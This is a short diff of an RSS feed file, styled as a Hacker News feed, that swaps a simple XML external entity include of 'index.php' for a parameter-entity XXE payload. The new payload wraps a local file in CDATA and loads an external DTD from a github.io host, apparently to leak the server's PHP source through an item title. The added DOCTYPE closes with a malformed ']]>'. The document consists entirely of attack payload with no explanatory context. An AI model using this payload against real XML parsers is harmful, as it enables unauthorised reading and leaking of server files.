@@ -1,7 +1,11 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE channel [
-  <!ENTITY include SYSTEM "index.php">
-]>
+<!DOCTYPE channel [ 
+  <!ENTITY % file SYSTEM "file://index.php">
+  <!ENTITY % start "<![CDATA["> 
+  <!ENTITY % end "]]>"> 
+  <!ENTITY % dtd SYSTEM "https://slavalaki.github.io/"> 
+  %dtd; 
+  ]]>
 <rss version="2.0">
   <channel>
     <title>Hacker News</title>
@@ -9,7 +13,7 @@
     <description>Links for the intellectually curious</description>
 
     <item>
-      <title>&include;</title>
+      <title>&all;</title>
       <link>https://oxide.computer/blog/our-100m-series-b</link>
       <description>Our $100M Series B announcement</description>
       <pubDate>Wed, 30 Jul 2025 13:17:28 +0000</pubDate>
